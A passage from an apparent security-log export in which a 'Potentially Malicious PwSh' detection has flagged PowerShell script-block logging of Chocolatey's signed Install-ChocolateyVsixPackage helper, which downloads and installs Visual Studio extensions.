OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.600 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,63,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyVsixPackage { <# .SYNOPSIS Downloads and installs a VSIX package for Visual Studio .DESCRIPTION VSIX packages are Extensions for the Visual Studio IDE. The Visual Studio Gallery at http://visualstudiogallery.msdn.microsoft.com/ is the public extension feed and hosts thousands of extensions. You can locate a VSIX Url by finding the download link of Visual Studio extensions on the Visual Studio Gallery. .NOTES Chocolatey works best when the packages contain the software it is managing and doesn't require downloads. However most software in the Windows world requires redistribution rights and when sharing packages publicly (like on the community feed), maintainers may not have those aforementioned rights. Chocolatey understands how to work with that, hence this function. You are not subject to this limitation with internal packages. .INPUTS None .OUTPUTS None .PARAMETER PackageName The name of the package - while this is an arbitrary value, it's recommended that it matches the package id. In 0.10.4+, `Name` is an alias for PackageName. .PARAMETER VsixUrl The URL of the package to be installed. Prefer HTTPS when available. Can be HTTP, FTP, or File URIs. In 0.10.4+, `Url` is an alias for VsixUrl. .PARAMETER VsVersion The major version number of Visual Studio where the package should be installed. This is optional. If not specified, the most recent Visual Studio installation will be targetted. NOTE: For Visual Studio 2015, the VsVersion is 14. It can be determined by looking at the folders under Program Files / Program Files (x86). In 0.10.4+, `VisualStudioVersion` is an alias for VsVersion. .PARAMETER Checksum The checksum hash value of the Url resource. This allows a checksum to be validated for files that are not local. The checksum type is covered by ChecksumType. **NOTE:** Checksums in packages are meant as a measure to validate the originally intended file that was used in the creation of a package is the same file that is received at a future date. Since this is used for other steps in the process related to the community repository, it ensures that the file a user receives is the same file a maintainer and a moderator (if applicable), plus any moderation review has intended for you to receive with this package. If you are looking at a remote source that uses the same url for updates, you will need to ensure the package also stays updated in line with those remote resource updates. You should look into [automatic packaging](https://chocolatey.org/docs/automatic-packages) to help provide that functionality. **NOTE:** To determine checksums, you can get that from the original site if provided. You can also use the [checksum tool available on the community feed](https://chocolatey.org/packages/checksum) (`choco install checksum`) and use it e.g. `checksum -t sha256 -f path\to\file`. Ensure you provide checksums for all remote resources used. .PARAMETER ChecksumType The type of checkum that the file is validated with - valid values are 'md5', 'sha1', 'sha256' or 'sha512' - defaults to 'md5'. MD5 is not recommended as certain organizations need to use FIPS compliant algorithms for hashing - see https://support.microsoft.com/en-us/kb/811833 for more details. The recommendation is to use at least SHA256. .PARAMETER Options OPTIONAL - Specify custom headers. Available in 0.9.10+. .PARAMETER File Will be used for VsixUrl if VsixUrl is empty. Available in 0.10.7+. This parameter provides compatibility, but should not be used directly and not with the community package repository until January 2018. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to the latest version of VS. Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to Visual Studio 2012 (v11.0). Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix ` -VsVersion 11 .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Install-ChocolateyZipPackage #> param( [alias(""name"")][parameter(Mandatory=$true, Position=0)][string] $packageName, [alias(""url"")][parameter(Mandatory=$false, Position=1)][string] $vsixUrl, [alias(""visualStudioVersion"")][parameter(Mandatory=$false, Position=2)][int] $vsVersion = 0, [parameter(Mandatory=$false)][string] $checksum = '', [parameter(Mandatory=$false)][string] $checksumType = '', [parameter(Mandatory=$false)][hashtable] $options = @{Headers=@{}}, [alias(""fileFullPath"")][parameter(Mandatory=$false)][string] $file = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($vsixUrl -eq '' -or $vsixUrl -eq $null) { $vsixUrl = $file } if($vsVersion -eq 0) { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } else { $versions=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } if($versions -and $versions.Length){ $version = $versions[0] }elseif($versions){ $version = $versions } } else { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } else { $version=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } } if ($version) { $vnum=$version.PSPath.Substring($version.PSPath.LastIndexOf('\')+1) if($vnum -as [int] -lt 10) { throw ""This installed VS version, $vnum, does not support installing VSIX packages. Version 10 is the minimum acceptable version."" } $dir=(get-itemProperty $version.PSPath ""InstallDir"").InstallDir $installer = Join-Path $dir ""VsixInstaller.exe"" } if ($installer) { $download=""$env:TEMP\$($packageName.Replace(' ','')).vsix"" try{ Get-ChocolateyWebFile $packageName $download $vsixUrl -checksum $checksum -checksumType $checksumType -Options $options } catch { throw ""There were errors attempting to retrieve the vsix from $vsixUrl. The error message was '$_'."" } Write-Debug ""Installing VSIX using $installer"" $exitCode = Install-Vsix ""$installer"" ""$download"" if($exitCode -gt 0 -and $exitCode -ne 1001) { #1001: Already installed throw ""There was an error installing '$packageName'. The exit code returned was $exitCode."" } } else { throw ""Visual Studio is not installed or the specified version is not present."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwvbwbcXwGHARv # s0aL6zHGEwZUxYCbjjh5ZcXDMGFCc6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgY21LEp9apuTMLqguzypSjDhrQ2TRe8edZGc6 # /Wjr8LIwDQYJKoZIhvcNAQEBBQAEggEAVqid4PiRvy3Rz95AXsqvb7v8clOSDutY # mBU2Njes3J1iOx+jQbU5SD02i04upCKFeaeNN9FfzidZa4Q88uoeirKsKi0UGrjr # BnUIzamzRNRO7w3LLz4ctku8eFoEsNtkclcXy6HW3cubvQ9UUmznObLjlWY42hvl # /vVvzRJYkQyC3LlO5ny2obm6e7ZjiCRSNpasr9SAfoudEhmU/O3nAtayW3KstSwX # 6YGEEdcYKiK9PuPYg4PgPP7tgQMNhN4hQkM4pwL2DvGPDO0Z9TKJpm/uaANdw7Fc # WlJL1zMlIuOtVrHtVX7emS1O+9k7eSaGPbo+SYHmjbUXGQXS/U0/SaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQU40gRxQX/DFfRvsp9 # uY236RUSX6swDQYJKoZIhvcNAQEBBQAEggEAdNctgo5xpF4Yvn6HDB1eWkeD2J7v # Ac6OQH2uoibswWMoa5QyXi4xmc8g4WULeNS32RyBeFWIicGr7We77EffVS6wvC2n # jjxXHuq1Lid5gxE7GgKs54GONcDbWCK7sWJ00qmkP7qrWMp5IrQxpNwgCuMTNBeL # ijKPb9xC3QnbiY9DOFoc5dc6fvFNAj93MqWi1tZUG524Fk+anAAYmExlUxDUmMPW # y8H2MnE9UtQFNSClb8KRZY9gkcpuOrR3dZsCU9deoW4qt8Y9zZ6SnjibCfHbuslP # EJ42K0/lJvs/KZRRjhscT8dOo732rd96hqXJjR9x6YnHdEEODbRXSxSHyA== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Install-ChocolateyVsixPackage.ps1 ¦ ScriptBlockId: a8a4e79e-63b3-4ba6-bf2a-f80f1e5cffe3 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy 